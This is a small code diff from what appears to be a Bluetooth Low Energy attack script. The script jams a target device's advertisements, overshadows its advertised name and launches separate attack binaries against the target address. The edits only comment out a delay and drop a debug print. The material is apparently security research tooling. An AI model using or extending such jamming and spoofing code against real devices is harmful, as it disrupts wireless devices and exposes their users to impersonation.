@@ -229,7 +229,7 @@ def main():
         args.overshadow_name = b" " + args.target_pattern
 
     print(f"Jamming all advertisements of {current_target_addr}")
-    time.sleep(1)
+    #time.sleep(1)
 
     # Start jammer
     try:
@@ -247,7 +247,6 @@ def main():
         while(True):
             time.sleep(1)
     elif args.attack_variant == 'auto':
-        print("starting auto")
         attack_process = subprocess.Popen([AUTO_BINARY_PATH, str(args.init_dev_num), str(args.resp_dev_num), args.overshadow_name, current_target_addr], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
     elif args.attack_variant == 'nop':
         attack_process = subprocess.Popen([NOP_BINARY_PATH, str(args.init_dev_num), str(args.resp_dev_num), args.overshadow_name, current_target_addr], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
